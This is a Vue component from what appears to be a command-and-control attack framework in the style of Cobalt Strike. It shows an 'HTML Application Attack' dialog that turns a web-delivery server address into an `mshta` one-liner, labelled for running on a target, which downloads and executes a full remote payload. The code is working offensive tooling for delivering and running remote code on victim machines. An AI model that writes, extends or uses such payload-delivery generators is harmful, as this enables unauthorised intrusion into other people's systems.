<template>
  <el-dialog
    v-model="visible"
    :title="isZh ? 'HTML 应用程序攻击 (HTA)' : 'HTML Application Attack'"
    width="720px"
    append-to-body
    class="cs-dialog"
    :close-on-click-modal="false"
  >
    <div class="cs-dialog-body">
      <div class="cs-dialog-desc">
        {{ isZh ? '基于 WebDelivery 投递生成 HTA 执行入口（后端 delivery hub 托管 /hta 脚本）。目标机执行 mshta 命令即可拉取并运行载荷。' : 'Builds an HTA entry from a WebDelivery (hosted /hta script by the delivery hub). Run the mshta one-liner on target to fetch and execute the payload.' }}
      </div>

      <div class="cs-form-row">
        <label class="cs-form-label">{{ isZh ? 'WebDelivery:' : 'Web Delivery:' }}</label>
        <el-select
          v-model="form.deliveryPort"
          size="small"
          class="cs-form-input"
          :placeholder="isZh ? '选择 WebDelivery 投递' : 'Select a WebDelivery'"
          @visible-change="onDropdown"
        >
          <el-option
            v-for="wd in webDeliveryOptions"
            :key="String(field(wd, 'ListeningPort', 'listening_port'))"
            :label="wdLabel(wd)"
            :value="String(field(wd, 'ListeningPort', 'listening_port'))"
          />
        </el-select>
      </div>

      <div class="cs-form-row">
        <label class="cs-form-label">{{ isZh ? '载荷类型:' : 'Payload:' }}</label>
        <el-select v-model="form.mode" size="small" class="cs-form-input">
          <el-option :label="isZh ? '完整客户端（运行时拉取）' : 'Full client (pull at runtime)'" value="url" />
        </el-select>
      </div>

      <div class="cs-form-hint">
        {{ isZh ? '后端仅支持 url 模式：HTA 运行时从投递地址下载并执行载荷（embed 模式 hta 分支未实现）。' : 'Backend supports url mode only: the HTA downloads and executes the payload at runtime (embed is not implemented for HTA).' }}
      </div>
    </div>

    <template #footer>
      <div class="cs-dialog-footer-center">
        <button class="cs-btn cs-btn-primary" :disabled="!form.deliveryPort" @click="handleGenerate">
          {{ isZh ? '生成 HTA 命令' : 'Generate HTA' }}
        </button>
        <button class="cs-btn" @click="handleHelp">{{ isZh ? '帮助' : 'Help' }}</button>
      </div>
    </template>
  </el-dialog>
</template>

<script setup lang="ts">
import { computed, reactive, ref, watch } from 'vue'
import { ElMessage, ElMessageBox } from 'element-plus'
import { useI18nStore } from '@/stores/i18n'
import { fetchWebDeliveryOptions, wdLabel, field, hintNoWebDelivery, type WebDeliveryRow } from './payloadUtil'

const i18nStore = useI18nStore()
const isZh = computed(() => i18nStore.isZh)

const props = defineProps<{
  modelValue: boolean
}>()

const emit = defineEmits<{
  (e: 'update:modelValue', val: boolean): void
}>()

const visible = computed({
  get: () => props.modelValue,
  set: (v) => emit('update:modelValue', v),
})

const webDeliveryOptions = ref<WebDeliveryRow[]>([])

const form = reactive({
  deliveryPort: '',
  mode: 'url',
})

watch(
  () => props.modelValue,
  (val) => {
    if (val) {
      form.deliveryPort = ''
      onDropdown(true)
    }
  },
)

async function onDropdown(visibleState?: boolean) {
  if (visibleState === false) return
  webDeliveryOptions.value = await fetchWebDeliveryOptions()
}

async function handleGenerate() {
  if (!form.deliveryPort) {
    ElMessage.warning(isZh.value ? '请选择 WebDelivery' : 'Select a WebDelivery first')
    return
  }
  const wd = webDeliveryOptions.value.find(
    (w) => String(field(w, 'ListeningPort', 'listening_port')) === form.deliveryPort,
  )
  if (!wd) {
    hintNoWebDelivery()
    return
  }
  // HTA 脚本由 delivery hub 托管：{base}/hta?mode=url|embed（base = ServerAddress 去掉 /full/... 后缀）
  const serverAddress = field(wd, 'ServerAddress', 'server_address') || ''
  const base = String(serverAddress).replace(/\/full\/.*$/, '')
  if (!base) {
    ElMessage.warning(isZh.value ? '该投递没有公开 URL，无法生成 HTA（shared 模式才有）' : 'No public URL for this delivery (shared mode required)')
    return
  }
  const htaUrl = `${base}/hta?mode=${form.mode}`
  const oneliner = `mshta "${htaUrl}"`
  try {
    await ElMessageBox.alert(
      `<div style="font-size:12px;margin-bottom:8px;">${isZh.value ? 'HTA 托管地址:' : 'Hosted HTA URL:'}</div>
       <div style="font-family:monospace;font-size:12px;color:#69b1ff;word-break:break-all;margin-bottom:12px;">${htaUrl}</div>
       <div style="font-size:12px;margin-bottom:8px;">${isZh.value ? '目标机执行命令:' : 'Target one-liner:'}</div>
       <textarea readonly style="width:100%;height:56px;background:#181818;color:#00e676;border:1px solid #444;padding:6px;font-family:monospace;font-size:12px;">${oneliner}</textarea>`,
      isZh.value ? 'HTA 投递命令' : 'HTA Delivery One-Liner',
      {
        dangerouslyUseHTMLString: true,
        confirmButtonText: isZh.value ? '复制并关闭' : 'Copy & Close',
        cancelButtonText: isZh.value ? '取消' : 'Cancel',
        callback: (action: string) => {
          if (action === 'confirm') {
            navigator.clipboard.writeText(oneliner).then(() => {
              ElMessage.success(isZh.value ? '命令已复制到剪贴板' : 'One-liner copied')
            })
          }
        },
      },
    )
    visible.value = false
  } catch {
    /* 用户取消 */
  }
}

function handleHelp() {
  ElMessage.info(isZh.value ? 'HTA 脚本由 delivery hub 实时生成并托管；url 模式运行时拉取 full 载荷，embed 模式内嵌 base64' : 'HTA is generated and hosted by the delivery hub; url pulls the full payload at runtime, embed inlines base64')
}
</script>

